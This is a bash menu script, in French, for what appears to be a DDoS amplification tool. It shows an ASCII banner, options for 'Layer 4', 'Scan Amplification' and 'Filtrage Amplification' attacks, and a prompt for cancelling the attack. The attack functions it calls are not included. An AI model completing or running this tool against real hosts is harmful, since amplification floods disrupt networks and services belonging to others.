Take_input1()
{
clear
while :
do
clear;clear
echo -en "
 █████╗ ███╗   ███╗██████╗ ██╗     ███████╗██╗   ██╗██████╗ 
██╔══██╗████╗ ████║██╔══██╗██║     ██╔════╝██║   ██║██╔══██╗
███████║██╔████╔██║██████╔╝██║     █████╗  ██║   ██║██████╔╝
██╔══██║██║╚██╔╝██║██╔═══╝ ██║     ██╔══╝  ██║   ██║██╔══██╗
██║  ██║██║ ╚═╝ ██║██║     ███████╗███████╗╚██████╔╝██║  ██║
╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
              Remake By Syntaxe Papa Pablo  Obito

\033[1;91m┌──────────────────────────────────┐
\033[1;91m│${CYAN} [1] LAYER 4                      \033[1;91m│
\033[1;91m│${CYAN} [2] Scan Amplification           \033[1;91m│
\033[1;91m│${CYAN} [3] Filtrage Amplification       \033[1;91m│
\033[1;91m│${CYAN} [CTRL+C] POUR ANNULER L'ATTAQUE  \033[1;91m│
\033[1;91m│${CYAN} [X] FERMER.                      \033[1;91m│
\033[1;91m└──────────────────────────────────┘
${CYAN}[\033[1;91mP A B L O${CYAN}]-家 "
    read yourch
    case $yourch in
	  1) _l4 ;;
	  2) _l7 ;;
    3) _l5 ;;
	  X) exit 1  ;;
      *) echo "Selection invalide," ;
         echo "Appuyez sur entrer." ; read ;;
 esac
done # end_while
}
#
# Set trap to for CTRL+C interrupt i.e. Install our error handler
# When occurs it first it calls del_file() and then exit
#
trap exit_script 2
#
# Call our user define function : Take_inpt1
#

Take_input1